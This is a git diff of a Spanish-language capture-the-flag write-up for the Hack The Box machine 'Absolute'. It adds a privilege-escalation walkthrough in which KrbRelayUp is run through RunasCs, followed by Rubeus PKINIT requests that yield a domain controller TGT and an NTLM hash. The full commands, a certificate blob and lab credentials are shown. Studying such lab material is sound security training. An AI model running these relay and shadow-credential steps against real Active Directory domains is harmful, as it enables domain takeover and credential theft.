@@ -14,13 +14,13 @@ tags:
   - impacket
   - whisker
   - rubeus
-  - pywhisker
   - certipy
   - krbrelay
+  - dacledit
 math: false
 mermaid: true
 image:
-  path: /assets/img/post/Absolute/Absolute.png
+  path: https://www.ngi.es/wp-content/uploads/2021/05/kerberos-windows.png
   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
   alt: Absolute
 ---
@@ -41,16 +41,17 @@ Absolute y la máquina Scrambled son de los mejores recursos para explorar los c
 
 - Enumeración de metadatos en imágenes.
 - Uso de **Username-Anarchy** para generar una wordlist que contenga posibles nombres de usuario
-- Ataque AS-REP Roast.
+- Ataque `AS-REP Roast`.
 - Autenticación a través de Kerberos.
-- Enumeración manual en Active Directory (AD).
-- Uso de Bloodhound para la enumeración.
+- Enumeración manual en Active Directory usando Kerberos.
+- Bloodhound.
 - Análisis dinámico de un binario compilado en Nim con Wireshark.
-- Explotación de DACL con `PowerView` y `dacl.py`
-- Shadow Credentials Attack con `certipy` y `Whisker`
-- KrbRelay Exploit.
+- Manipulación de DACLs con `PowerView` y `dacl.py`
+- `Shadow Credentials Attack` con `certipy` y `Whisker`
+- Uso de `KrbRelayUp` para elevar privilegios.
 
 Dicho esto vamos al lío.
+
 ## nmap
 
 ```ruby
@@ -123,7 +124,12 @@ Host script results:
 
 ## Recon
 
-A primera vista, podemos observar que los puertos (53, 88, 389) correspondientes a DNS, Kerberos y LDAP están abiertos, lo cual ya es un indicador claro de que nos encontramos frente a un controlador de dominio.
+A primera vista, podemos observar que los puertos (53, 88, 389) correspondientes a DNS, Kerberos y LDAP están abiertos, lo cual ya es un indicador claro de que nos encontramos frente a un controlador de dominio. También por SMB y LDAP, se filtra el hostname y el FQDN de la máquina. Por lo cual yo aconsejo modificar el fichero `hosts` con la siguiente estructura:
+
+```bash
+10.129.142.54   dc.absolute.htb absolute.htb
+```
+Es importante poner primero el FQDN para evitar problemas a futuro con Kerberos.
 
 ### Web 80 - TCP
 
@@ -156,7 +162,7 @@ El siguiente paso consiste en formatear el archivo de manera que **Username-Anar
 ```
 :%s/ /,/g
 ```
-{: .nolineno }
+
 El fichero final es el siguiente:
 
 ```bash
@@ -289,7 +295,7 @@ OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 1
 ```bash
 $krb5asrep$23$d.klay@ABSOLUTE.HTB:7dcc8ee944cbd8d9acffd5e52e051762$6f4acb9b53597e032fa24da7f8c4ac8c4f66e92394b5512c9702841ac64f134052687e40aa5beb40a7977ecd1b0b91e1b90fbfef6ede949050627e5d43ff2a4a4c1ee7f4cee2df7c3534c4a4fb674a5863f170414049ac2b2d95e4cda2679bfab591c205f1b6f3a942432e4d74f68350cb6300cf90309c1ca714e1ec0520b2058ac5199b5056a8319869eab3aedc35688b1cd3911dc0e2c071fe6e1da57040497021ddd2e2bdaec6544bedf696dd2eb0d7df0b5f1bf3a90846939dfc93322c58fd42b6c05303436f81c870b7847481c033112905c1f6d316c78cd439fb52f10d9381e1c8c0804c2e4be542c8:Darkmoonsky248girl
 ```
-
+{: .nolineno }
 Tras conseguir obtener la contraseña del usuario `d.klay` en texto plano, voy a validarla usando `crackmapexec`, y obtenemos el siguiente resultado:
 
 ```bash
@@ -350,7 +356,7 @@ Por ejemplo voy a conectarme por `rpcclient` al DC, usando las credenciales de `
 ❯ rpcclient -U 'absolute.htb\d.klay%Darkmoonsky248girl' 10.129.68.75
 Cannot connect to server.  Error was NT_STATUS_ACCOUNT_RESTRICTION
 ```
-
+{: .nolineno }
 El siguiente mensaje indica que la autenticación NTLM está desactivada. En cambió si lo hago con Kerberos, la cosa cambia.
 
 ```bash
@@ -522,9 +528,8 @@ SMB         10.129.229.59   445    DC               IPC$            READ        
 SMB         10.129.229.59   445    DC               NETLOGON        READ            Logon server share 
 SMB         10.129.229.59   445    DC               Shared                          
 SMB         10.129.229.59   445    DC               SYSVOL          READ            Logon server share 
-
 ```
-
+{: .nolineno }
 Vemos una carpeta llamada `Shared` , que de momento no podemos acceder, pero sería interesante apuntar para mirar más tarde.
 #### Bloodhound
 
@@ -638,9 +643,8 @@ Probamos la contraseña del usuario `svc_smb` y vemos que es válida dentro del 
 ❯ cme smb 10.129.229.59 -u 'svc_smb' -p 'AbsoluteSMBService123!' -k
 SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 SMB         10.129.229.59   445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
-
 ```
-
+{: .nolineno }
 Anteriormente disponíamos de una carpeta compartida por SMB, a la cual no teníamos acceso, vamos a comprobar si ahora con el nuevo usuario comprometido podemos:
 
 ### Enumerando SMB Autenticado
@@ -679,6 +683,7 @@ Password:
 Type help for list of commands
 # 
 ```
+{: .nolineno }
 
 Dentro del fichero vemos dos ficheros, voy a descargarlos para inspeccionarlos detenidamente.
 {: .nolineno }
@@ -841,10 +846,12 @@ Esto quiere decir que podemos escribir atribustos específicos del usuario `winr
 
 Con este ataque es posible añadir Key Credentials al atributo `msDS-KeyCredentialLink` del objeto usuario/ordenador de destino y luego realizar la autenticación Kerberos como esa cuenta utilizando `PKINIT`. 
 
-(Explicar lo del PKINIT)
+Los requisitos para para que este ataque funcione son los siguientes:
 
-En este enlace se explica como realizar este ataque, y las condiciones necesarias que se deben de tener para que funcione:  
-[Shadow Credentials Attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
+* El dominio debe tener AD CS configurado
+* El dominio debe tener un DC ejecutandose con WS 2016 que soporte PKINIT
+
+El ataque explicado a detalle se puede encontrar aquí: [Shadow Credentials Attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
 
 ### Añadiendo a m.lovegood a Network Audit
 
@@ -912,6 +919,7 @@ Password for [WORKGROUP\m.lovegod]:
 absolute\m.lovegod
 absolute\svc_audit
 ```
+{: .nolineno }
 #### Método 2: Desde Windows
 
 El proceso anterior es mucho más sencillo desde una máquina Windows. El primer paso será generar una sesión para el usuario `m.lovegod`, como la autenticación NTLM está desactivada, lo haré mediante Kerberos. Para ello haré uso de `Rubeus.exe`
@@ -1079,7 +1087,7 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Successfully restored the old Key Credentials for 'winrm_user'
 [*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
 ```
-
+{: .nolineno }
 Como hemos visto antes, la autenticación NTLM está desactivada, por lo que el hash solo sirve para intentar crackearlo y obtener la contraseña en texto plano., cosa que no he conseguido. En este caso usamos el TGT `.ccache`, para conectarnos por WinRM al DC.
 
 ```
@@ -1278,8 +1286,194 @@ Y finalmente obtenemos una shell dentro del sistema.
 
 ## Escalada de Privilegios
 
-### KrbRelay
+### KrbRelayUp
 
-![[Pasted image 20231108200504.png]]
+Después de tirar Winpeas para enumerar posibles vías de elevar mi privilegio, nos muestra una opción que es `KrbRelayUp`
 
-![[Pasted image 20231108202525.png]]
+![img](/assets/img/post/Absolute/34.png)
+
+que consiste en crear una cuenta de máquina y aprovecharla para realizar un ataque Kerberos Relay en el controlador de dominio con la firma LDAP deshabilitada. Para que el ataque funcione el sistema no debe de estar parcheado desde octubre de 2022, y el LDAP debe no debe de estar firmado (por defecto en Windows).
+
+Normalmente con crackmapexec podemos enumerar si el LDAP esta firmado o no, pero en está maquina en concreto no funciona, vamos a suponer que esta sin firmar ya que es la opción por defecto.
+
+```bash
+❯ cme ldap 10.129.142.54 -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k  -M ldap-checker
+SMB         10.129.142.54   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.142.54   389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
+LDAP-CHE... 10.129.142.54   389    DC               [-] [!!!] invalid credentials - aborting to prevent unnecessary authentication
+```
+{: .nolineno }
+Podemos comprobar la versión de Windows, podemos ejecutar el siguiente comando.
+
+```
+[dc.absolute.htb]: PS C:\Users\winrm_user\Documents> reg query "hklm\software\microsoft\windows nt\currentversion" /v ProductName
+
+HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion
+    ProductName    REG_SZ    Windows Server 2019 Standard
+
+```
+
+Como esta máquina fue lanzada en septiembre del 2022, es probable que no tenga el parche instalado. Así que vamos a clonar el repositorio de [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) para compilarlo en VS Code.
+
+![img](/assets/img/post/Absolute/35.png)
+![img](/assets/img/post/Absolute/38.png)
+
+Una vez compilado lo pasamos a la máquina víctima. Si lo ejecutamos nos dará un error.
+
+![img](/assets/img/post/Absolute/36.png)
+
+Leyendo la documentación del repositorio es necesario de disponer de una sesión interactiva como por ejemplo RDP. Esto lo podemos solucionar con [RunasCS.exe](https://github.com/antonioCoco/RunasCs). Debemos ejecutar el comando como `m.lovegod` ya que es el que tiene permisos para cambiar `msDS-KeyCredentialLink` cambiando el logon type a 9, ya que el 2 y 3 dan problemas debido a que la autenticación NTLM este desactivada para este usuario. 
+
+![img](/assets/img/post/Absolute/37.png)
+
+Al igual que en los Potatoes, es necesario tener un CLSID para un servicio RPC válido. Aquí se pueden encontrar varios [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standard). Yo siempre elijo los de `TrustedInstaller`
+
+```
+[dc.absolute.htb]: PS C:\programdata\pe> .\RunasCs.exe m.lovegod 'AbsoluteLDAP2022!' -d absolute.htb -l 9 ".\KrbRelayUp.exe relay -m shadowcred -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}"
+
+KrbRelayUp - Relaying you to SYSTEM
+
+
+[+] Rewriting function table
+[+] Rewriting PEB
+[+] Init COM server
+[+] Register COM server
+[+] Forcing SYSTEM authentication
+[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
+[+] LDAP session established
+[+] Generating certificate
+[+] Certificate generated
+[+] Generating KeyCredential
+[+] KeyCredential generated with DeviceID dc6bb9da-2de4-4f0e-a68b-ee27ee606de2
+[+] KeyCredential added successfully
+[+] Run the spawn method for SYSTEM shell:
+    ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce 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 -cep kN9=qE6/eA2#
+```
+
+El output de KrbRelayUp indica que ejecutó con éxito el ataque, y creó shadow credentials para la cuenta de `DC$`. Si ese es el caso, puedo tratar de utilizar este certificado con contraseña de una manera diferente. Voy a utilizar rubeus desde mi máquina Windows y ejecutarlo de la siguiente forma para obtener el hash NT:
+
+>Es importante contar con un ticket para el usuario `m.lovegod`
+{: .prompt-warning }
+
+```
+PS C:\Users\Alex> C:\tools\Rubeus.exe asktgt /user:DC$ /certificate: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 /password:'xL8=jH0/bQ3@' /getcredentials /show /nowrap /domain:absolute.htb
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN="CN=DC", OU=Domain Controllers, DC=absolute, DC=htb
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
+[*] Using domain controller: 10.129.142.54:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  krbtgt/absolute.htb
+  ServiceRealm             :  ABSOLUTE.HTB
+  UserName                 :  DC$
+  UserRealm                :  ABSOLUTE.HTB
+  StartTime                :  09/11/2023 17:41:28
+  EndTime                  :  10/11/2023 3:41:28
+  RenewTill                :  16/11/2023 17:41:28
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  M7L7gv/zz5xzthM7VzufIw==
+  ASREP (key)              :  E6F2D6246EAB85BF294F3043757EE442
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : A7864AB463177ACB9AEC553F18F42577
+```
+
